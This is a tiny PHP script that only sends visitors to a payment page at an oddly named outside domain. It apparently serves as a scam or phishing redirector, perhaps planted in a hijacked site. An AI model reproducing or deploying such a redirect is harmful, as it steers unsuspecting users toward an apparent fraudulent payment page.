<?php
  header('Location: http://recoiineq.com/sc/0C2S17UK5F6/pay.html');
  exit();
?>